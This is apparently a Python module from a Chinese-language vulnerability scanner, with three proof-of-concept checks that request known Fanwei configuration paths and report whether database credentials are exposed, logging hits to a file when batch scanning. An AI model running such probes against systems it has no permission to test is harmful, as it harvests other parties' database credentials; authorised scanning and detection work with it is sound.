#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class FanweiDBInfoScan:

    def run(self, urls):
        try:
            response = requests.get(f'{urls}/mysql_config.ini', headers=self.headers, proxies=self.proxy,verify=self.ssl)
            if "datauser" in response.text:
                if not self.batch:
                    OutPrintInfoSuc("FanWei", '存在FanWei敏感信息泄漏')
                    OutPrintInfo("FanWei", f"{urls}/mysql_config.ini")
                else:
                    OutPrintInfoSuc("FanWei", f'存在FanWei敏感信息泄漏{urls}/mysql_config.ini')
                    OutPutFile("fanwei_db_info.txt",f"存在FanWei敏感信息泄漏{urls}/mysql_config.ini")
            else:
                if not self.batch:
                    OutPrintInfo("FanWei", '不存在FanWei敏感信息泄漏')
        except Exception:
            if not self.batch:
                OutPrintInfo("FanWei", '目标请求出错')
    def run2(self, urls):
        try:
            response = requests.get(f'{urls}/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini', headers=self.headers, proxies=self.proxy,verify=self.ssl)
            if "sdbuser" in response.text:
                if not self.batch:
                    OutPrintInfoSuc("FanWei", '存在FanWei敏感信息泄漏')
                    OutPrintInfo("FanWei", f"{urls}/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini")
                else:
                    OutPrintInfoSuc("FanWei", f'存在FanWei敏感信息泄漏{urls}/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini')
                    OutPutFile("fanwei_db_info.txt",f"存在FanWei敏感信息泄漏{urls}/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini")
            else:
                if not self.batch:
                    OutPrintInfo("FanWei", '不存在FanWei敏感信息泄漏')
        except Exception:
            if not self.batch:
                OutPrintInfo("FanWei", '目标请求出错')
    def run3(self, urls):
        try:
            response = requests.get(f'{urls}/building/config/config.ini', headers=self.headers, proxies=self.proxy,verify=self.ssl)
            if "building" in response.text:
                if not self.batch:
                    OutPrintInfoSuc("FanWei", '存在FanWei敏感信息泄漏')
                    OutPrintInfo("FanWei", f"{urls}/building/config/config.ini")
                else:
                    OutPrintInfoSuc("FanWei", f'存在FanWei敏感信息泄漏{urls}/building/config/config.ini')
                    OutPutFile("fanwei_db_info.txt",f"存在FanWei敏感信息泄漏{urls}/building/config/config.ini")
            else:
                if not self.batch:
                    OutPrintInfo("FanWei", '不存在FanWei敏感信息泄漏')
        except Exception:
            if not self.batch:
                OutPrintInfo("FanWei", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("FanWei", '开始执行FanWei敏感信息泄漏检测...')
            OutPrintInfo("FanWei", '开始执行POC-1...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("FanWei", '开始执行POC-2...')
        self.run2(url)
        if not self.batch:
            OutPrintInfo("FanWei", '开始执行POC-3...')
        self.run3(url)
        if not self.batch:
            OutPrintInfo("FanWei", 'FanWei敏感信息泄漏检测执行结束')
